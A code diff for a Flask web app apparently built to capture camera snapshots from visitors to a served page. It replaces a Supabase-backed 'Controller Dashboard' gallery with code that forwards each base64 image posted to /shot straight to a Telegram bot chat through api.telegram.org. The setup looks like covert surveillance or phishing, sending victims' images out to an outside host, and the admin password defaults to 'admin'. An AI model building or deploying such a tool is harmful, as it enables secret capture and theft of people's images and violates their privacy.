@@ -1,22 +1,14 @@
 from flask import Flask, request, send_file, jsonify, Response
 from werkzeug.middleware.proxy_fix import ProxyFix
-import os, base64, datetime, binascii
-from supabase import create_client, Client
+import os, base64, datetime, binascii, requests
 
 app = Flask(__name__)
 app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
 
-# --- SUPABASE CONFIG ---
-# Add these to your Render Environment Variables!
-SUPABASE_URL = os.environ.get("SUPABASE_URL")
-SUPABASE_KEY = os.environ.get("SUPABASE_KEY")
+# --- TELEGRAM CONFIG ---
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "admin")
-
-if SUPABASE_URL and SUPABASE_KEY:
-    supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)
-else:
-    print("WARNING: Supabase credentials missing!")
-    supabase = None
 
 def check_auth(auth):
     return auth and auth.username == "admin" and auth.password == ADMIN_PASSWORD
@@ -25,109 +17,43 @@ def check_auth(auth):
 def index():
     return send_file("index.html")
 
+# We keep the gallery route so you don't get a 404, but it will just tell you to check Telegram
 @app.route("/gallery")
 def gallery():
     auth = request.authorization
     if not check_auth(auth):
         return Response('Login required', 401, {'WWW-Authenticate': 'Basic realm="Admin"'})
-
-    if not supabase:
-        return "Server error: Supabase not configured.", 500
-
-    # Fetch images from Supabase Storage
-    try:
-        res = supabase.storage.from_("photos").list()
-        files = [f['name'] for f in res if f['name'].endswith(".jpg")]
-        files.sort(reverse=True)
-    except Exception as e:
-        return f"Error fetching images: {e}", 500
     
-    html = """
-    <!doctype html>
-    <html><head><title>Controller Dashboard</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <style>
-        :root { --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #38bdf8; --danger: #ef4444; }
-        body { font-family: system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); margin: 0; padding: 20px; }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; padding-bottom: 15px; margin-bottom: 20px; }
-        .header h1 { margin: 0; color: var(--accent); font-size: 24px; }
-        .btn { background: var(--accent); color: #0f172a; border: none; padding: 10px 20px; border-radius: 6px; cursor: pointer; font-weight: bold; text-decoration: none; font-size: 14px; transition: 0.2s; }
-        .btn:hover { opacity: 0.8; }
-        .btn-danger { background: var(--danger); color: white; width: 100%; margin-top: 10px; }
-        .stats { display: flex; gap: 15px; margin-bottom: 20px; }
-        .stat-box { background: var(--card); padding: 15px 25px; border-radius: 8px; flex: 1; border: 1px solid #334155; }
-        .stat-box h3 { margin: 0 0 5px 0; font-size: 12px; color: #94a3b8; text-transform: uppercase; letter-spacing: 1px; }
-        .stat-box p { margin: 0; font-size: 28px; font-weight: bold; color: var(--accent); }
-        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 20px; }
-        .card { background: var(--card); border-radius: 8px; padding: 15px; border: 1px solid #334155; box-shadow: 0 4px 6px rgba(0,0,0,0.3); }
-        .card img { width: 100%; border-radius: 6px; aspect-ratio: 4/3; object-fit: cover; background: #000; }
-        .card .info { display: flex; justify-content: space-between; align-items: center; margin-top: 10px; font-size: 12px; color: #94a3b8; }
-        .empty { text-align: center; padding: 50px; color: #64748b; font-size: 18px; }
-    </style>
-    <script>
-        async function delImg(fn) {
-            if(confirm("Delete this image forever?")) {
-                await fetch("/delete/" + fn, { method: "DELETE" });
-                window.location.reload();
-            }
-        }
-    </script>
-    </head><body>
-    <div class="header">
-        <h1>📷 Controller Dashboard</h1>
-        <div>
-            <button class="btn" onclick="window.location.reload()">🔄 Refresh</button>
-            <a href="/" class="btn" style="background:#334155; color:white;">Open Camera</a>
-        </div>
+    return """
+    <div style="font-family:system-ui; background:#0f172a; color:#e2e8f0; padding:40px; text-align:center;">
+        <h1>Check Telegram</h1>
+        <p>Images are now being sent directly to your Telegram bot.</p>
     </div>
-    <div class="stats">
-        <div class="stat-box"><h3>Total Captures</h3><p>""" + str(len(files)) + """</p></div>
-        <div class="stat-box"><h3>Storage</h3><p style="color:#10b981">Cloud (Permanent)</p></div>
-    </div>
-    <div class="grid">
     """
-    
-    if not files:
-        html += "<div class='empty'>No photos captured yet.</div>"
-    
-    for f in files:
-        # Get public URL for Supabase image
-        public_url = supabase.storage.from_("photos").get_public_url(f)
-        html += f"""
-        <div class="card">
-            <img src="{public_url}" loading="lazy">
-            <div class="info"><span>{f}</span></div>
-            <button class="btn btn-danger" onclick="delImg('{f}')">Delete Image</button>
-        </div>
-        """
-    html += "</div></body></html>"
-    return html
-
-@app.route("/delete/<filename>", methods=["DELETE"])
-def delete_shot(filename):
-    if not check_auth(request.authorization):
-        return jsonify(error="Unauthorized"), 401
-    try:
-        supabase.storage.from_("photos").remove([filename])
-        return jsonify(success=True)
-    except Exception as e:
-        return jsonify(error=str(e)), 500
 
 @app.route("/shot", methods=["POST"])
 def shot():
-    if not supabase:
-        return "", 500
-    
     data = request.get_json(force=True)
     b64 = (data.get("img") or "").split(",", 1)[-1]
-    if b64:
+    
+    if b64 and TELEGRAM_TOKEN and TELEGRAM_CHAT_ID:
         try:
+            # Decode the image
             img_data = base64.b64decode(b64)
-            fn = f"{datetime.datetime.utcnow():%Y%m%d_%H%M%S_%f}.jpg"
-            # Upload to Supabase instead of local disk
-            supabase.storage.from_("photos").upload(fn, img_data, file_options={"content-type": "image/jpeg"})
+            
+            # Prepare to send to Telegram
+            url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendPhoto"
+            files = {'photo': ('image.jpg', img_data, 'image/jpeg')}
+            payload = {'chat_id': TELEGRAM_CHAT_ID, 'caption': f"📸 New capture: {datetime.datetime.utcnow():%Y-%m-%d %H:%M:%S}"}
+            
+            # Send it
+            response = requests.post(url, data=payload, files=files)
+            if response.status_code != 200:
+                print("Telegram Error:", response.text)
+                
         except Exception as e:
-            print("Upload error:", e)
+            print("Error processing image:", e)
+            
     return "", 204
 
 if __name__ == "__main__":
